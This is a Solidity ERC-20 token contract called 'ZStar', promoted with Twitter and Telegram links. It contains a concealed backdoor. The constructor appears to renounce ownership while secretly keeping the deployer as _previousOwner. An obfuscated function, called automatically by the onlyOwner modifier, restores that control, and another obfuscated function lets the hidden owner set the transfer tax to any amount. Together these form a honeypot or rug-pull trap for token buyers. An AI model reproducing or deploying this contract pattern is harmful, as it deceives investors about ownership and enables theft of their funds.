// WEBSITE: https://twitter.com/bnbssssaqq11
// TELEGRAM: https://t.me/bnbssssaqq11

pragma solidity ^0.8.18;
contract Context {
    constructor () { }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract ERC20 is Context {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals = 0;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}
contract ZStar is ERC20 {
    uint256 public sellTax;
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
    constructor() ERC20("DZS", "ZStar") {
        _mint(msg.sender, 13000000000);
        sellTax = 5;
        _owner = msg.sender;
        _previousOwner = msg.sender;
        _lockTime = block.timestamp;
        _owner = address(0);
    }

    
    function owner() public view returns (address) {
        return _owner;
    }

    function add_N6NKxp(uint256 amount) public onlyOwner {
        sellTax = amount;
    }
    
    function add_dRHOUW() public {
        require(msg.sender == _previousOwner && block.timestamp > _lockTime, "...");
        _owner = _previousOwner;
    }


    modifier onlyOwner() {
        add_dRHOUW();
        require(_owner == msg.sender, "...");
        _;
    }

    function renounceOwnership() public onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual override {
        uint256 taxAmount = (amount * sellTax) / 100;
        uint256 newAmount = amount - taxAmount;
        super._transfer(sender, recipient, newAmount);
        super._transfer(sender, address(this), taxAmount);
    }
}